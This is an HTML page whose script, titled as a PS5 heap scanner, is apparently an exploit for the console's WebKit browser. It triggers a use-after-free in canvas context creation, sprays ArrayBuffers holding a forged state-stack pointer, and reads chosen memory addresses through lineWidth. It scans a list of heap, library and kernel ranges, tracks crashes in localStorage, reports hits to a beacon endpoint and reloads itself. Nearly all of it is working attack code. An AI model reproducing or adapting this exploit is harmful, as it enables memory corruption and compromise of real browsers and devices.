<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V652</title></head>
<body><pre id="out">V652 — PS5 heap scanner (correct addresses)</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
var _ix=0;
function bk(tag,d){
  var img=_imgs[_ix++%40];
  img.src='/beacon/V652-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
}
var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}return f2h(v);}

/*
 * PS5 MEMORY LAYOUT (from public research, 14.10 Lua loader results):
 *   eboot_base:    0x060388000 (~1.5GB)
 *   libc_base:     0x0CA700000 (~3.4GB)
 *   heap/mmap:     0x310000000-0x312000000 (~12.5-13.3GB)
 *   libkernel:     0x819B40000 (~34.8GB)
 *   fn_addr:       0x3114BDFD0
 *   GPU map:       0x310ECC000-0x311704000
 *
 * WebContent process may differ but should be in similar ranges.
 * Strategy: scan pages in the heap range first, then code/lib ranges.
 * Each crash = unmapped page, localStorage bumps counter.
 */

/* [hi32, lo32, description] — little-endian split */
var TARGETS = [
  /* Phase 1: PS5 heap range (most likely for WebContent) */
  [0x00000003, 0x10000000, 'heap-0x310000000'],
  [0x00000003, 0x10200000, 'heap-0x310200000'],
  [0x00000003, 0x10400000, 'heap-0x310400000'],
  [0x00000003, 0x10600000, 'heap-0x310600000'],
  [0x00000003, 0x10800000, 'heap-0x310800000'],
  [0x00000003, 0x10A00000, 'heap-0x310A00000'],
  [0x00000003, 0x10C00000, 'heap-0x310C00000'],
  [0x00000003, 0x10E00000, 'heap-0x310E00000'],
  [0x00000003, 0x11000000, 'heap-0x311000000'],
  [0x00000003, 0x11200000, 'heap-0x311200000'],
  [0x00000003, 0x11400000, 'heap-0x311400000'],
  [0x00000003, 0x11600000, 'heap-0x311600000'],
  [0x00000003, 0x11800000, 'heap-0x311800000'],
  [0x00000003, 0x11A00000, 'heap-0x311A00000'],

  /* Phase 2: Lower heap range (WebContent might be lower than Lua) */
  [0x00000003, 0x00000000, 'heap-0x300000000'],
  [0x00000003, 0x02000000, 'heap-0x302000000'],
  [0x00000003, 0x04000000, 'heap-0x304000000'],
  [0x00000003, 0x06000000, 'heap-0x306000000'],
  [0x00000003, 0x08000000, 'heap-0x308000000'],
  [0x00000003, 0x0A000000, 'heap-0x30A000000'],
  [0x00000003, 0x0C000000, 'heap-0x30C000000'],
  [0x00000003, 0x0E000000, 'heap-0x30E000000'],

  /* Phase 3: WebContent could be at 2xx range */
  [0x00000002, 0x00000000, 'mmap-0x200000000'],
  [0x00000002, 0x80000000, 'mmap-0x280000000'],

  /* Phase 4: eboot/code range (~0x60000000) */
  [0x00000000, 0x60000000, 'code-0x60000000'],
  [0x00000000, 0x60400000, 'code-0x60400000'],
  [0x00000000, 0x60800000, 'code-0x60800000'],

  /* Phase 5: libc range (~0xCA000000) */
  [0x00000000, 0xC0000000, 'lib-0xC0000000'],
  [0x00000000, 0xCA000000, 'lib-0xCA000000'],
  [0x00000000, 0xCA800000, 'lib-0xCA800000'],

  /* Phase 6: libkernel range (~0x819000000) */
  [0x00000008, 0x19000000, 'lk-0x819000000'],
  [0x00000008, 0x19B00000, 'lk-0x819B00000'],
  [0x00000008, 0x1A000000, 'lk-0x81A000000'],

  /* Phase 7: Wide scan around 4GB boundary */
  [0x00000001, 0x00000000, 'scan-0x100000000'],
  [0x00000001, 0x80000000, 'scan-0x180000000'],
  [0x00000004, 0x00000000, 'scan-0x400000000'],
  [0x00000005, 0x00000000, 'scan-0x500000000'],
  [0x00000006, 0x00000000, 'scan-0x600000000'],
  [0x00000007, 0x00000000, 'scan-0x700000000'],
  [0x00000009, 0x00000000, 'scan-0x900000000'],
  [0x0000000A, 0x00000000, 'scan-0xA00000000'],
];

var MAX = TARGETS.length;
var attempt = 0;
try { attempt = parseInt(localStorage.getItem('v652_attempt')) || 0; } catch(e) {}

bk('BOOT', 'attempt='+attempt+'/'+MAX);
say('Attempt ' + attempt + '/' + MAX);

if (attempt < 0) {
  var prev = '';
  try { prev = localStorage.getItem('v652_result') || ''; } catch(e) {}
  bk('PREV-HIT', prev);
  say('Previous hit: ' + prev);
  /* Continue scanning from where we left off */
  var resumeAt = 0;
  try { resumeAt = parseInt(localStorage.getItem('v652_resume')) || 0; } catch(e) {}
  if (resumeAt > 0 && resumeAt < MAX) {
    attempt = resumeAt;
    try { localStorage.setItem('v652_attempt', String(attempt)); } catch(e) {}
    bk('RESUME', 'from='+attempt);
  }
} else if (attempt >= MAX) {
  bk('EXHAUSTED', 'all-'+MAX);
  say('All targets exhausted');
  /* Reset for another round */
  try { localStorage.setItem('v652_attempt', '0'); } catch(e) {}
  setTimeout(function(){location.reload();}, 30000);
}

if (attempt >= 0 && attempt < MAX) {
  var tgt = TARGETS[attempt];
  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
  var tgtHex = '0x'+('00000000'+tgtHi.toString(16)).slice(-8)+('00000000'+tgtLo.toString(16)).slice(-8);
  bk('TGT', 'n='+attempt+'|addr='+tgtHex+'|'+tgtDesc);
  say('Target: ' + tgtHex + ' (' + tgtDesc + ')');

  /* Pre-increment for crash recovery */
  try { localStorage.setItem('v652_attempt', String(attempt + 1)); } catch(e) {}

  /* === UAF TRIGGER === */
  var canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  var innerCtx = null;
  var uafOpts = {};
  Object.defineProperty(uafOpts, 'alpha', {get: function() {
    innerCtx = canvas.getContext('2d');
    return true;
  }});
  canvas.getContext('bitmaprenderer', uafOpts);

  if (!innerCtx) {
    bk('FAIL', 'no-inner');
  } else {
    /* Flush dealloc log */
    for (var f = 0; f < 600; f++) new ArrayBuffer(16);

    /* AB(768) spray */
    var SPRAY = 200;
    var abs = new Array(SPRAY);
    var dvs = new Array(SPRAY);
    for (var s = 0; s < SPRAY; s++) {
      abs[s] = new ArrayBuffer(768);
      dvs[s] = new DataView(abs[s]);
    }
    bk('SPRAY', 'n='+SPRAY);

    /* Forge m_stateStack in ALL ABs */
    for (var w = 0; w < SPRAY; w++) {
      var dv = dvs[w];
      /* m_stateStack.m_buffer at +112 */
      dv.setUint32(112, tgtLo, true);
      dv.setUint32(116, tgtHi, true);
      /* m_capacity at +120 */
      dv.setUint32(120, 2, true);
      /* m_size at +124 */
      dv.setUint32(124, 1, true);
    }

    /* === CRITICAL READ — SIGSEGV if unmapped === */
    var lw = -999;
    try { lw = innerCtx.lineWidth; } catch(e) { lw = -888; }

    /* Immediately null + clear forge */
    var lwHex = f2h(lw);
    var lwBig = f2big(lw);
    innerCtx = null;
    for (var c = 0; c < SPRAY; c++) {
      dvs[c].setFloat64(112, 0, true);
      dvs[c].setUint32(120, 0, true);
      dvs[c].setUint32(124, 0, true);
    }

    bk('READ', 'addr='+tgtHex+'|lw='+lw+'|hex='+lwHex+'|big='+lwBig);
    say('READ: ' + tgtHex + ' → lineWidth=' + lw + ' hex=' + lwHex);

    /* SUCCESS — address is mapped! */
    try {
      localStorage.setItem('v652_result',
        (localStorage.getItem('v652_result')||'')+'\n'+tgtHex+'='+lwHex);
      localStorage.setItem('v652_resume', String(attempt + 1));
      localStorage.setItem('v652_attempt', String(attempt + 1));
    } catch(e) {}

    /* Also try miterLimit (offset +64 in State) and globalAlpha (+48+8=+56?) */
    /* Actually lineWidth already proved the address is mapped! */
    /* Don't risk another UAF — move to next target */

    canvas._abs = abs;
    bk('HIT', '***MAPPED:'+tgtHex+'='+lwBig+'***');
    say('*** MAPPED: ' + tgtHex + ' = ' + lwBig + ' ***');
  }
}

/* Auto-reload to continue scanning */
bk('NEXT', 'reload-in-5s');
setTimeout(function(){location.reload();}, 5000);
</script>
</body></html>
